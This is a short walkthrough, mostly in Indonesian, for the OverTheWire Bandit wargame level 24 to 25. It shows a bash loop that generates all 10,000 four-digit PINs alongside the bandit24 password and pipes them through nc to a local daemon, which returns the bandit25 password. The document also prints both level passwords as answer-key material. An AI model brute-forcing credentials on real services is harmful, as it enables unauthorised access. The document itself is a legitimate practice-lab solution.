# Level Goal
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

# Solusi
password didapatkan ketika kita berhasil memasukkan pin yang valid. permasalahan kita tidak tau pin berapa yang valid.\
kita bisa lakukan bruteforce untuk level ini\
berikut script
```
bandit24@bandit:/tmp/bandi25$ cat ban25.sh
#!/bin/bash
for i in {0000..9999}
do
    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
done
```
lalu kita simpan menjadi ***txt file***
```
bandit24@bandit:/tmp/bandi25$ ./ban25.sh > bf.txt
bandit24@bandit:/tmp/bandi25$ ls
ban25.sh  bf.txt
```
lalu kita lakukan pipe 
```
bandit24@bandit:/tmp/solu24$ cat bf.txt | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
.
.
.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
```
didapatkan password untuk masuk ke bandit25
<details>
<summary>Password</summary>
uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
</details>